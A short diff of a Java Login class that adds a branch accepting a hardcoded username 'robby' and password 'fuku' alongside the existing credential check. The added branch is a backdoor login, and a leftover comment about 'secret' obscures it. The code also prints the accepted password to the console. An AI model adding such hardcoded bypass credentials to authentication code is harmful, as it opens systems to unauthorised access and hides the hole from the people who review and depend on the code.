@@ -20,6 +20,10 @@ public class Login {
     	   System.out.println("Password " + args[3] + " accepted");
             return true;
         }
+       else if (args[2].toLowerCase().equals("robby") && args[3].equals("fuku")) { //password.equals("secret")
+    	   System.out.println("Password " + args[3] + " accepted");
+            return true;
+       }
        else
        {
     	   
